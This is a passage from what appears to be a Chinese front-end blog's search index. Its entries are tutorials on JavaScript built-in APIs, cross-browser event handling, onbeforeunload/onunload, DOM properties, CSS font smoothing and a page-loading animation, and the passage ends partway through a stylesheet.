//用于删除数组的第一个元素，并返回该元素。unshift(value) //用于在数组的第一个位置添加元素，并返回添加新元素后的数组长度。reverse() //用于颠倒数组中元素的顺序，返回改变后的数组slice(start_index, upto_index); //用于提取原数组的一部分，返回一个新数组，原数组不变。第一个参数为起始位置（从0开始），第二个参数为终止位置（但该位置的元素本身不包括在内）。如果省略第二个参数，则一直返回到原数组的最后一个成员。负数表示倒数第几个。splice(index, count_to_remove, addElement1, addElement2, ...); //用于删除原数组的一部分成员，并可以在被删除的位置添加入新的数组成员，返回值是被删除的元素。第一个参数是删除的起始位置，第二个参数是被删除的元素个数。如果后面还有更多的参数，则表示这些就是要被插入数组的新元素。sort() //对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。如果想让sort方法按照自定义方式排序，可以传入一个函数作为参数，表示按照自定义方法进行排序。该函数本身又接受两个参数，表示进行比较的两个元素。如果返回值大于0，表示第一个元素排在第二个元素后面；其他情况下，都是第一个元素排在第二个元素前面。map() //对数组的所有成员依次调用一个函数，根据函数结果返回一个新数组。map(elem,index,arr) //map方法接受一个函数作为参数。该函数调用时，map方法会将其传入三个参数，分别是当前成员、当前位置和数组本身。forEach() //遍历数组的所有成员，执行某种操作,参数是一个函数。它接受三个参数，分别是当前位置的值、当前位置的编号和整个数组。filter() //参数是一个函数，所有数组成员依次执行该函数，返回结果为true的成员组成一个新数组返回。该方法不会改变原数组。some() //用来判断数组成员是否符合某种条件。接受一个函数作为参数，所有数组成员依次执行该函数，返回一个布尔值。该函数接受三个参数，依次是当前位置的成员、当前位置的序号和整个数组。只要有一个数组成员的返回值是true，则整个some方法的返回值就是true，否则false。every() //用来判断数组成员是否符合某种条件。接受一个函数作为参数，所有数组成员依次执行该函数，返回一个布尔值。该函数接受三个参数，依次是当前位置的成员、当前位置的序号和整个数组。所有数组成员的返回值都是true，才返回true，否则false。reduce() //依次处理数组的每个成员，最终累计为一个值。从左到右处理（从第一个成员到最后一个成员）reduceRight() //依次处理数组的每个成员，最终累计为一个值。从右到左（从最后一个成员到第一个成员）indexOf(s) //返回给定元素在数组中第一次出现的位置，如果没有出现则返回-1。可以接受第二个参数，表示搜索的开始位置lastIndexOf() //返回给定元素在数组中最后一次出现的位置，如果没有出现则返回-1。3.3 Number对象（1）生成对象1var n = new Number()（2）Number对象的属性1234567Number.POSITIVE_INFINITY：正的无限，指向Infinity。 Number.NEGATIVE_INFINITY：负的无限，指向-Infinity。 Number.NaN：表示非数值，指向NaN。 Number.MAX_VALUE：表示最大的正数，相应的，最小的负数为-Number.MAX_VALUE。 Number.MIN_VALUE：表示最小的正数（即最接近0的正数，在64位浮点数体系中为5e-324），相应的，最接近0的负数为-Number.MIN_VALUE。 Number.MAX_SAFE_INTEGER：表示能够精确表示的最大整数，即9007199254740991。 Number.MIN_SAFE_INTEGER：表示能够精确表示的最小整数，即-9007199254740991。（4）Number对象实例的方法1234toString() //用来将一个数值转为字符串形式.可以接受一个参数，表示输出的进制。如果省略这个参数，默认将数值先转为十进制，再输出字符串；否则，就根据参数指定的进制，将一个数字转化成某个进制的字符串。toFixed() //用于将一个数转为指定位数的小数，返回这个小数对应的字符串。toExponential() //用于将一个数转为科学计数法形式。可传入一个参数，参数表示小数点后有效数字的位数，范围为0到20，超出这个范围，会抛出一个RangeError。toPrecision() //用于将一个数转为指定位数的有效数字。3.4 String 对象（1）生成实例对象1var s = new String()（2）String对象的属性1s.length //返回字符串的长度（3）方法1234567891011121314151617s.chatAt(index) //返回指定位置的字符s.fromCharCode() //该方法的参数是一系列Unicode码点，返回对应的字符串。s.charCodeAt(index) //返回给定位置字符的Unicode码点（十进制表示）s.concat(s2) //用于连接两个字符串s.slice(start,end) //用于从原字符串取出子字符串并返回，不改变原字符串。第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置（不含该位置）。如果参数是负值，表示从结尾开始倒数计算的位置，即该负值加上字符串长度。s.substring(start,end) //用于从原字符串取出子字符串并返回，不改变原字符串.第一个参数表示子字符串的开始位置，第二个位置表示结束位置。s.substr(start,length) //用于从原字符串取出子字符串并返回，不改变原字符串。第一个参数是子字符串的开始位置，第二个参数是子字符串的长度。如果第一个参数是负数，表示倒数计算的字符位置。如果第二个参数是负数，将被自动转为0，因此会返回空字符串。s.indexOf(s) //返回给定元素在字符串中第一次出现的位置，如果没有出现则返回-1。可以接受第二个参数，表示搜索的开始位置 s.lastIndexOf() //返回给定元素在字符串中最后一次出现的位置，如果没有出现则返回-1。s.trim() //用于去除字符串两端的空格，返回一个新字符串s.toLowerCase() //用于将一个字符串全部转为小写,返回一个新字符串，不改变原字符串。s.toUpperCase() //全部转为大写s.localeCompare(s2) //用于比较两个字符串。它返回一个整数，如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；如果大于0，表示第一个字符串大于第二个字符串。s.match(regexp) //用于确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回null。s.search() //返回值为匹配的第一个位置。如果没有找到匹配，则返回-1。s.replace(oldValue,newValue) //用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有g修饰符的正则表达式）。s.split() //按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组。还可传入第二个参数，决定了返回数组的成员数。3.5 Math对象（1）属性12345678Math.E：常数e。 Math.LN2：2的自然对数。 Math.LN10：10的自然对数。 Math.LOG2E：以2为底的e的对数。 Math.LOG10E：以10为底的e的对数。 Math.PI：常数Pi。 Math.SQRT1_2：0.5的平方根。 Math.SQRT2：2的平方根。（2）数学方法1234567891011Math.abs()：返回参数的绝对值 Math.ceil()：向上取整，接受一个参数，返回大于该参数的最小整数。 Math.floor()：向下取整 Math.max(n,n1,...)：可接受多个参数，返回最大值 Math.min(n,n1,..)：可接受多个参数，返回最小值 Math.pow(n,e)：指数运算, 返回以第一个参数为底数、第二个参数为幂的指数值。 Math.sqrt()：返回参数值的平方根。如果参数是一个负值，则返回NaN。 Math.log()：返回以e为底的自然对数值。Math.exp()：返回e的指数，也就是常数e的参数次方。Math.round()：四舍五入 Math.random()：返回0到1之间的一个伪随机数，可能等于0，但是一定小于1。（3）三角函数方法123456Math.sin()：返回参数的正弦 Math.cos()：返回参数的余弦 Math.tan()：返回参数的正切 Math.asin()：返回参数的反正弦（弧度值） Math.acos()：返回参数的反余弦（弧度值） Math.atan()：返回参数的反正切（弧度值）3.6 JSON对象（1）方法123456JSON.stringify() //用于将一个值转为字符串。该字符串应该符合JSON格式，并且可以被JSON.parse方法还原。//（JSON.stringify(obj, selectedProperties)）还可以接受一个数组，作为第二个参数，指定需要转成字符串的属性。//还可以接受第三个参数，用于增加返回的JSON字符串的可读性。如果是数字，表示每个属性前面添加的空格（最多不超过10个）；如果是字符串（不超过10个字符），则该字符串会添加在每行前面。JSON.parse() //用于将JSON字符串转化成对象。3.7 console对象（1）方法1234567891011121314151617181920212223242526console.log(text,text2,...) //用于在console窗口输出信息。它可以接受多个参数，将它们的结果连接起来输出。如果第一个参数是格式字符串（使用了格式占位符），console.log方法将依次用后面的参数替换占位符，然后再进行输出。console.info() //在console窗口输出信息，同时，会在输出信息的前面，加上一个蓝色图标。console.debug() //在console窗口输出信息，同时，会在输出信息的前面，加上一个蓝色图标。console.warn() //输出信息时，在最前面加一个黄色三角，表示警告；console.error() //输出信息时，在最前面加一个红色的叉，表示出错，同时会显示错误发生的堆栈console.table() //可以将复合类型的数据转为表格显示。console.count() //用于计数，输出它被调用了多少次。console.dir() //用来对一个对象进行检查（inspect），并以易于阅读和打印的格式显示。console.dirxml() //用于以目录树的形式，显示DOM节点。console.assert() //接受两个参数，第一个参数是表达式，第二个参数是字符串。只有当第一个参数为false，才会输出第二个参数，否则不会有任何结果。//这两个方法用于计时，可以算出一个操作所花费的准确时间。console.time()console.timeEnd()//time方法表示计时开始，timeEnd方法表示计时结束。它们的参数是计时器的名称。调用timeEnd方法之后，console窗口会显示“计时器名称: 所耗费的时间”。console.profile() //用来新建一个性能测试器（profile），它的参数是性能测试器的名字。console.profileEnd() //用来结束正在运行的性能测试器。console.group()console.groupend()//上面这两个方法用于将显示的信息分组。它只在输出大量信息时有用，分在一组的信息，可以用鼠标折叠/展开。console.groupCollapsed() //用于将显示的信息分组，该组的内容，在第一次显示时是收起的（collapsed），而不是展开的。console.trace() //显示当前执行的代码在堆栈中的调用路径。console.clear() //用于清除当前控制台的所有输出，将光标回置到第一行。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JavaScript常用API合集</tag>
        <tag>js常用api合集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js实现一些跨浏览器的兼容事件方法]]></title>
    <url>%2F2016%2F11%2F02%2Fjs%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%BA%9B%E8%B7%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%85%BC%E5%AE%B9%E4%BA%8B%E4%BB%B6%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[用JavaScript实现事件的绑定，移除，以及一些常用的事件属性的获取，时常要考虑到在不同浏览器下的兼容性，下面给出了一个跨浏览器的事件对象：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758var EventUtil = &#123; on: function(element, type, handler) &#123;/* 添加事件 */ if (element.addEventListener) &#123; element.addEventListener(type, handler, false); &#125; else if (element.attachEvent) &#123;//IE 注意：此时事件处理程序会在全局作用域中运行，因此用attachEvent绑定的事件，此时在事件处理函数里的this 等于window，使用时要注意 element.attachEvent("on" + type, handler); &#125; else &#123; element["on" + type] = handler; &#125; &#125;, off: function(element, type, handler) &#123;/* 移除事件 */ if (element.removeEventListener) &#123; element.removeEventListener(type, handler, false); &#125; else if (element.detachEvent) &#123; element.detachEvent("on" + type, handler); &#125; else &#123; element["on" + type] = null; &#125; &#125;, getEvent: function(event) &#123;/* 返回对event对象的引用 */ return event ? event : window.event; &#125;, getTarget: function(event) &#123;/* 返回事件的目标 */ return event.target || event.srcElement; &#125;, preventDefault: function(event) &#123; /* 取消事件的默认行为 */ if (event.preventDefault) &#123; event.preventDefault(); &#125; else &#123; event.returnValue = false; &#125; &#125;, stopPropagation: function(event) &#123;/* 阻止事件冒泡 */ if (event.stopPropagation) &#123; event.stopPropagation(); &#125; else &#123; event.cancelBubble = true; &#125; &#125;, /* mouseover 和mouserout 这两个事件都会涉及把鼠标指针从一个元素的边界之内移动到另一个元素的边界之内。*/ getRelatedTarget: function(event) &#123; if (event.relatedTarget) &#123; return event.relatedTarget; &#125; else if (event.toElement) &#123;//IE8 mouserout事件 return event.toElement; &#125; else if (event.fromElement) &#123;//IE8 mouseover事件 return event.fromElement; &#125; else &#123; return null;//其他事件 &#125; &#125;&#125;;调用如下：1234EventUtil.on(document, "click", function(event)&#123;//为document元素绑定click事件 event = EventUtil.getEvent(event);//获取event事件对象 alert("Screen coordinates: " + event.screenX + "," + event.screenY);&#125;);]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js跨浏览器的兼容事件方法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[检测监控浏览器(窗口)关闭、跳转、刷新：onbeforeunload与onunload事件]]></title>
    <url>%2F2016%2F10%2F20%2F%E6%A3%80%E6%B5%8B%E7%9B%91%E6%8E%A7%E6%B5%8F%E8%A7%88%E5%99%A8%E7%AA%97%E5%8F%A3%E5%85%B3%E9%97%AD%E3%80%81%E8%B7%B3%E8%BD%AC%E3%80%81%E5%88%B7%E6%96%B0%EF%BC%9Aonbeforeunload%E4%B8%8Eonunload%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;浏览器窗口关闭可以使用window.close(),但并没有与之相对应的事件，页面加载也是使用onload事件监听。onunload和unbeforeunload事件都是在页面刷新或关闭的时候执行。可以在1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556**这两个事件的区别**1、onbeforeunload也是在页面刷新或关闭时调用，onbeforeunload是正要去服务器读取新的页面时调用，此时还没开始读取；2、onunload则已经从服务器上读到了需要加载的新的页面，在即将替换掉当前页面时调用。3、onunload是无法阻止页面的更新和关闭的，而onbeforeunload 可以做到。**页面加载时只执行onload****页面关闭时先执行onbeforeunload，最后onunload****页面刷新时先执行onbeforeunload，然后onunload，最后onload。**## 1、onbeforeunload事件：说明：目前三大主流浏览器中firefox和IE都支持onbeforeunload事件,opera尚未支持。用法：object.onbeforeunload = handler&lt;element onbeforeunload = “handler” … &gt;&lt;/element&gt;描述：事件触发的时候弹出一个有确定和取消的对话框，确定则离开页面，取消则继续待在本页。handler可以设一个返回值作为该对话框的显示文本。触发于：* 关闭浏览器窗口* 通过地址栏或收藏夹前往其他页面的时候* 点击返回，前进，刷新，主页其中一个的时候* 点击 一个前往其他页面的url连接的时候* 调用以下任意一个事件的时候：click，document write，document open，document close，window close ，window navigate ，window NavigateAndFind,location replace,location reload,form submit.* 当用window open打开一个页面，并把本页的window的名字传给要打开的页面的时候。* 重新赋予location.href的值的时候。* 通过input type=”submit”按钮提交一个具有指定action的表单的时候。可以用在以下元素：BODY, FRAMESET, window* 平台支持：IE4+/Win, Mozilla 1.7a+, Netscape 7.2+, Firefox0.9+示例：```html&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;beforeunload测试&lt;/title&gt;&lt;script&gt;function checkLeave()&#123;event.returnValue=&quot;确定离开当前页面吗？&quot;;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body onbeforeunload=&quot;checkLeave()&quot;&gt;&lt;/body&gt;&lt;/html&gt;2、onunload事件用法：object.onbeforeunload = handler描述：当用户关闭一个页面时触发 onunload 事件。触发于：关闭浏览器窗口通过地址栏或收藏夹前往其他页面的时候点击返回，前进，刷新，主页其中一个的时候点击 一个前往其他页面的url连接的时候调用以下任意一个事件的时候：click，document write，document open，document close，window close ，window navigate ，window NavigateAndFind,location replace,location reload,form submit.当用window open打开一个页面，并把本页的window的名字传给要打开的页面的时候。重新赋予location.href的值的时候。通过input type=”submit”按钮提交一个具有指定action的表单的时候。示例：1234567891011121314&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;unload测试&lt;/title&gt;&lt;script&gt;function checkLeave()&#123;alert("欢迎下次再来");&#125;&lt;/script&gt;&lt;/head&gt;&lt;body onbeforeunload="checkLeave()"&gt;&lt;/body&gt;&lt;/html&gt;一个判断页面是否真的关闭和刷新的好方法：12345678window.onbeforeunload=function ()&#123;alert("===onbeforeunload===");if(event.clientX&gt;document.body.clientWidth &amp;amp;&amp;amp; event.clientY &lt; 0 || event.altKey)&#123;alert("你关闭了浏览器");&#125;else&#123;alert("你正在刷新页面");&#125;&#125;&emsp;&emsp;这段代码就是判断触发onbeforeunload事件时，鼠标是否点击了关闭按钮，或者按了ALT+F4来关闭网页，如果是，则认为系统是关闭网页，否则在认为系统是刷新网页。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>onbeforeunload与onunload事件</tag>
        <tag>检测浏览器关闭</tag>
        <tag>检测浏览器刷新</tag>
        <tag>检测浏览器跳转</tag>
        <tag>监控浏览器关闭</tag>
        <tag>监控浏览器刷新</tag>
        <tag>监控浏览器跳转</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取js文件后面的参数]]></title>
    <url>%2F2016%2F10%2F18%2F%E8%8E%B7%E5%8F%96js%E6%96%87%E4%BB%B6%E5%90%8E%E9%9D%A2%E7%9A%84%E5%8F%82%E6%95%B0%2F</url>
    <content type="text"><![CDATA[type="text/javascript" src="tongji.js?id=loginbox">```123456789101112131415161718192021就是如何获取id是多少了?第一获取src```javascript/*获取当前的js文件的路径@method getJsPath@param &#123;string&#125; jsname js文件名称*/function getJsPath(jsname) &#123; var js = document.scripts; var jsPath = &quot;&quot;; for (var i = js.length; i &gt; 0; i--) &#123; if (js[i - 1].src.indexOf(jsname) &gt; -1) &#123; return js[i - 1].src; &#125;else&#123; return; &#125; &#125; return jsPath;&#125;第二从src中获取参数的值12345678910111213141516171819202122/*获取js文件后面的参数 @method getParam@param &#123;string&#125; jspath js文件路径@param &#123;string&#125; parm 参数名称 */function getParam(jspath, parm)&#123; if (typeof jspath=='undefined') &#123;return "";&#125; if (jspath.indexOf('?')&gt;0) &#123; var urlparse = jspath.split("\?"); &#125;else&#123; return ""; &#125; var parms = urlparse[1].split("&amp;"); var values = &#123;&#125;; for(var i = 0; i &lt; parms.length; i++) &#123; var pr = parms[i].split("="); if (pr[0] == parm) return pr[1]; &#125; return "";&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>获取js文件后面的参数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript 常用DOM操作整理]]></title>
    <url>%2F2016%2F10%2F08%2Fjavascript-%E5%B8%B8%E7%94%A8dom%E6%93%8D%E4%BD%9C%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[1.抽取了DOM操作中常用的部分2.DOM属性和方法的对象归属可能并不完全准确3.某些兼容性和特点做了标识(绝大部分的兼容性是ie8~9上下)节点类型节点类型节点值标签节点(Element)1属性节点(Attr)2文本节点(Text)3CDATA节点(CDATASetion)4实体引用节点(EntityReference)5实体节点(Entity)6处理指令节点(ProcessingInstruction)7注释节点(Comment)8文档节点(Document)9文档类型节点(DocumentType)10文档片段节点(DocumentFragment)11DTD声明节点(Notation)12Node类型属性说明nodeType节点类型nodeName节点名nodeValue节点值childNodes子节点parentNode父节点ownerDocument文档节点previousSibling上一个节点nextSibling下一个节点firstChild第一个子节点lastChild最后一个子节点Document类型属性说明documentElementhtml标签head [兼容性不够]head标签bodybody标签URL当前页urlreferrer来源页urldomain [可修改]页面域名images所有图片集合cookiecookie信息title页面标题activeElement当前焦点元素documentMode文档模式readyState文档状态doctype文档类型声明scripts脚本集合formsform标签集合children元素类型的子节点集合defaultViewdocument关联的window对象方法说明getElementById()返回对应id的元素getElementsByName()返回对应名称元素集合getElementsByTagName()返回对应标签名元素集合getElementsByClassName()返回指定类名的元素集合querySelector()返回符合选择器的第一个元素querySelectorAll()返回符合选择器的元素集合createElement()创建元素节点createTextNode()创建文本节点createAttribute()创建属性节点createComment()创建注释节点createDocumentFragment()创建空的 DocumentFragment 对象matchesSelector()[兼容性不够，需要前缀]该选择器是否符合元素匹配write()[输出后光标不换行]文档文本写入writeIn()[输出后光标换行]文档文本写入implementation.hasFeature(特性,版本)特性监测Element类型属性说明ididclassName类名title标题style设置或返回元素的样式属性innerHTML设置或者返回元素的内容outerHTML[包含自身]设置或者返回元素的内容textContent[ie-innerText]设置或返回文本内容contentEditable设置或返回元素的可编辑状态isContentEditable是否可编辑childElementCount子元素节点个数firstElementChild第一个元素节点lastElementChild最后一个元素节点previousElementSibling上一个元素节点nextElementSibling下一个元素节点方法说明返回focus()设置焦点blur()失去焦点appendChild(节点)在子节点列表之后插入新增节点insertBefore(节点,参照节点)在参照节点之前插入节点插入节点removeChild(节点)节点删除被删节点replaceChild(节点,被替换的节点)节点替换被替换节点cloneNode(布尔值)复制节点克隆节点importNode(节点,布尔值)从A文档中取得a节点，将其导入B文档(类似cloneNode方法)contains(节点)该节点是否为调用节点的子级布尔值hasFocus()是否获得了焦点布尔值hasChildNodes()是否存在子节点布尔值isDefaultNamespace(url)是否指定了名称空间布尔值isEqualNode(节点)两个元素是否相等布尔值isSupported(特性，版本)是否支持某特性布尔值Attr类型属性说明name属性名value属性值isId是否为id类型specified属性是否被指定length属性长度attributes属性集合方法说明getAttribute()获取属性值getAttributeNode()获取属性节点setAttribute()设置属性值setAttributeNode()设置属性节点removeAttribute()删除属性removeAttributeNode()[ie不支持]删除属性节点hasAttribute()是否存在指定的属性hasAttributes()是否存在属性Text类型方法说明appendData(文本)将text添加到节点的末尾deleteData(位置,数量)从指定位置开始删除n个字符insertData(位置,文本)从指定位置插入文本replaceData(位置,数量,文本)用text替换从offset位置开始到offset+count为止处的文本splitText(位置)从指定位置将当前文本节点分裂成两个文本节点substringData(位置,数量)截取从offset位置开始到offset+count为止处的字符串normalize()合并相邻文本节点，并删除空的文本节点表格操作table元素元素，将其放到表格中，返回引用 元素，将其放到表格中，返回引用属性方法说明captioncaption元素指针tBodiestbody集合tFoottfoot集合tHeadthead元素rows表格所有行集合createTHead()创建createTFoot()创建——createCaption()创建caption元素，将其放到表格中，返回引用deleteTHead()删除thead元素deleteTFoot()删除tfoot元素deleteCaption()删除caption元素deleteRow(pos)删除指定位置的行insertRow(pos)向行集合中的指定位置插入一行tbody元素属性方法说明rowstbody所有行集合deleteRow(pos)删除指定位置的行insertRow(pos)向行集合中的指定位置插入一行，返回引用tr元素属性方法说明cellstr所有单元格集合deleteCell(pos)删除指定位置的单元格insertCell(pos)向单元格集合中的指定位置插入一个单元格，返回引用样式操作访问元素样式DOM样式——js通过dom.style只能访问直接样式属性，不能访问嵌入样式表和外部样式表属性方法(dom.style)说明cssText返回style特性中所有样式的字符串形式length返回元素中CSS属性数量parentRule返回CSS信息的CSSRule对象getPropertyCSSValue(name)返回属性值的CSSValue对象(包含cssText和cssValueType)getPropertyPriority(name)是否使用了!important属性getPropertyValue(name)返回给定属性的字符串值removeProperty(name)从样式中删除给定属性setProperty(name,value,优先级)将给定属性设置为相应的值并加上优先级计算样式——样式层叠后实际起用的样式属性方法说明document.defaultView.getComputedStyle(dom,伪元素字符串)[ie不支持]返回当前元素所有计算后的样式dom.currentStyle [ie支持]返回当前元素所有计算后的样式操作样式表document.styleSheets——应用于文档的所有样式表属性(document.styleSheet)说明cssRules[ie不支持]单个样式表中的所有样式规则rules[ie支持]单个样式表中的所有样式规则document.styleSheets[n].cssRules/rules下属性说明cssText[ie不支持]整条样式规则的字符串selectorText样式选择符style具体样式对象大小和偏移属性说明offsetParent偏移的父容器getBoundingClientRect()获取页面元素实际位置和宽高(返回属性对象）offsetWidth元素宽度(可视内容区+滚动条+内边距+边框)offsetHeight元素高度(可视内容区+滚动条+内边距+边框)offsetLeft与相邻父级的左距离offsetTop与相邻父级的上距离clientWidth元素宽度 (可视内容区+内边距)clientHeight元素高度 (可视内容区+内边距)clientLeft内边距边缘与边框边缘的距离 (左边框)clientTop内边距边缘与边框边缘的距离 (上边框)scrollWidth元素宽度 (可视内容区+滚动内容区+内边距)scrollHeight元素高度 (可视内容区+滚动内容区+内边距)scrollLeft隐藏的滚动宽度 (待滚动宽度)scrollTop隐藏的滚动高度 (待滚动宽度)兼容性clientWidth/clientHeight和scrollWidth/scrollHeight存在游览器差异]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>javascript常用DOM操作</tag>
        <tag>js常用DOM操作</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让页面字体显得清晰、平滑、无锯齿的CSS方法]]></title>
    <url>%2F2016%2F09%2F18%2F%E8%AE%A9%E9%A1%B5%E9%9D%A2%E5%AD%97%E4%BD%93%E6%98%BE%E5%BE%97%E6%B8%85%E6%99%B0%E3%80%81%E5%B9%B3%E6%BB%91%E3%80%81%E6%97%A0%E9%94%AF%E9%BD%BF%E7%9A%84css%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;近期遇到一个项目，对字体要求十分严格，字体不使用bloder，并且使字体看起来更清晰更平滑无锯齿，我对设计并不在行，对印刷排版也没有研究，但我知道什么字体好看，什么不好看。几年前我就看到过CSS里有一些属性很奇怪，当我设置这些属性或取消这些属性后，字体看起来会变得好看和不那么好看。这就是字体平滑设置的效果。但今天这里，只是介绍分享一下-webkit-font-smoothing它的基本用法：1、为了对比明显我就先将-webkit-font-smoothing设置为none，非常模糊。2、将-webkit-font-smoothing设置为antialiased，变得非常平滑，效果非常不错。3、其默认可以支持6个值（如图），暂时我能看到效果的就是三个：none | subpixel-antialiased | antialiased其他的三个，我设置了，好像没什么变化。大家可以自己在控制台调试看看。1234body &#123; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;&#125;在CSS里加入这些设置和不加这些设置，区别是很微妙的：进行平滑设置的字体效果:无进行平滑设置的字体效果:&emsp;&emsp;区别并不是很大，但前者确实是看着更舒服，更柔和。下一次在设计你的网站显示样式时，可以尝试一下这些字体显示技术，也许会给你带来意想不到的效果！]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>-moz-osx-font-smoothing</tag>
        <tag>-webkit-font-smoothing</tag>
        <tag>让页面字体显得平滑的CSS方法</tag>
        <tag>让页面字体显得无锯齿的CSS方法</tag>
        <tag>让页面字体显得清晰的CSS方法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[原生JS首页进度加载动画]]></title>
    <url>%2F2016%2F09%2F14%2F%E5%8E%9F%E7%94%9Fjs%E9%A6%96%E9%A1%B5%E8%BF%9B%E5%BA%A6%E5%8A%A0%E8%BD%BD%E5%8A%A8%E7%94%BB%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;本实例的实现原理比较简单，不过不是真正的按文件大小来显示加载进度的，只是在触发document.onreadystatechange事件时，根据document.readyState的状态来改变显示进度的。加载时间统计用了Windows对象的performance属性，它是专门用来来计算精确时间的方法，其实还有一种靠谱一点的方法，用XMLHttpRequest对象的实例的progress事件，如：1234567var request = new XMLHttpRequest();request.onprogress = function (e) &#123;if(e.lengthComputable)&#123; //lengthComputable是指文件是否有大小，值为true、falseprogress.innerHTML = Math.round(100* e.loaded/ e.total) + \'%\';//loaded、total表示已经加载的大小和总大小&#125;&#125;&emsp;&emsp;用以上方法实现起来也挺麻烦，而且也不能实现100%的真实加载进度，所以索性就假一点了，不用他了！本实例还用到了document.styleSheets[0].insertRule()方法关于CSS动画的实现，大家自己看代码吧，很简单的代码下面是完整代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;原生JS首页进度加载动画 - grycheng&lt;/title&gt;&lt;script&gt;document.onreadystatechange = function () &#123;function $id(id)&#123;return document.getElementById(id)&#125;var width = 0,id,preloader_line = $id('preloader_line').firstElementChild,preloader = $id('preloader'),preloader_center = $id('preloader_center'),preloader_btn = $id('preloader_btn'),preloader_loading = $id('preloader_loading');if (document.readyState == "interactive") &#123;loading(1,110,50);&#125;if (document.readyState == "complete") &#123;loading(5,120,16.7);preloader_loading.id = 'preloader_loaded';preloader_loading.innerHTML = 'Loading Complete'+'&lt;br/&gt;'+'Using: '+performance.now().toFixed(3)+' ms';preloader_btn.innerHTML = 'E N T E R';preloader_btn.style.borderBottom = '4px solid green';preloader_btn.style.fontStyle = 'inherit';preloader_btn.style.fontSize = '24px';if(document.styleSheets[0].insertRule)&#123;document.styleSheets[0].insertRule('#preloader_btn:hover&#123;border-bottom: 4px solid green;border-radius: 60px;color: red;&#125;',0);&#125;else&#123;//兼容IE9以下document.styleSheets[0].addRule('#preloader_btn:hover&#123;border-bottom: 4px solid green;border-radius: 60px;color: red;&#125;',0);&#125;preloader_btn.onclick = function () &#123;var opacity = 1,id;function hide()&#123;if(opacity&lt;=0)&#123;clearTimeout(id);preloader.style.display = 'none';document.body.style.overflow = 'auto';return;&#125;opacity -= 0.1;preloader.style.opacity = opacity;id = setTimeout(function()&#123;hide();&#125;,50);&#125;hide();&#125;;&#125;function loading(step,max,time)&#123;if(width&gt;=max)&#123;clearTimeout(id);if(max &gt;= 120)&#123;preloader_line.parentNode.style.display = 'none';&#125;return;&#125;width += step;preloader_line.style.width = width+'px';id = setTimeout(function()&#123;loading(step,max,time);&#125;,time);&#125;&#125;;&lt;/script&gt;&lt;style&gt;body&#123;overflow:hidden&#125;#preloader&#123;position:absolute;width:100%;height:100%;background-color:white;z-index:999&#125;#preloader_center&#123;position:absolute;left:0;right:0;top:0;bottom:0;width:150px;height:75px;margin:auto&#125;#preloader_loading&#123;position:absolute;left:0;right:0;top:45px;margin:auto;width:96px;height:30px&#125;#preloader_loaded&#123;position:absolute;left:0;right:0;top:45px;margin:auto;font-size:12px;text-align:center;line-height:30px&#125;#preloader_loading span&#123;position:absolute;width:10px;height:2px;top:0;bottom:0;margin:auto;background-color:#9b59b6;animation:loading 1.5s infinite ease-in-out&#125;#preloader_loading span:nth-child(2)&#123;left:12px;animation-delay:.1s&#125;#preloader_loading span:nth-child(3)&#123;left:24px;animation-delay:.2s&#125;#preloader_loading span:nth-child(4)&#123;left:36px;animation-delay:.3s&#125;#preloader_loading span:nth-child(5)&#123;left:48px;animation-delay:.4s&#125;#preloader_loading span:nth-child(6)&#123;left:50px;animation-delay:.5s&#125;#preloader_loading span:nth-child(7)&#123;left:62px;animation-delay:.6s&#125;#preloader_loading span:nth-child(8)&#123;left:74px;animation-delay:.7s&#125;#preloader_loading span:nth-child(9)&#123;left:86px;animation-delay:.8s&#125;@keyframes loading&#123;0%&#123;height:2px;background:#9b59b6&#125;15%&#123;height:20px;background:#3498db&#125;50%&#123;height:2px;background:#9b59b6&#125;100%&#123;height:2px;background:#9b59b6&#125;&#125;iframe&#123;width:100%;height:1000px&#125;#preloader_btn&#123;position:absolute;left:0;right:0;top:0;margin:auto;display:block;width:122px;height:40px;font-size:14px;text-align:center;line-height:40px;cursor:pointer;color:#9b59b6;font-style:italic;-webkit-transition:all .5s;-moz-transition:all .5s;-ms-transition:all .5s;-o-transition:all .5s;transition:all .5s&#125;#preloader_line&#123;position:absolute;left:0;right:0;top:40px;margin:auto;width:120px;height:2px;border:1px solid green&#125;#preloader_line 